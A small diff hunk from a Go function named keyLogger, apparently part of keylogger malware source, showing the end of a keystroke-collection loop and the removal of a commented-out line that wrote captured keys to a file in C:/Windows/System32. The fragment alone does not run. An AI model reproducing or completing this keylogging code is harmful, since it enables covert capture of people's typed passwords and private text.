@@ -178,7 +178,6 @@ func keyLogger(length int) string {
 					log += "z"
 				}
 				if len(log) > length {
-					/*ioutil.WriteFile("C:/Windows/System32/4567234.txt", []byte(log), 0777) */
 					return log
 				}
 			}
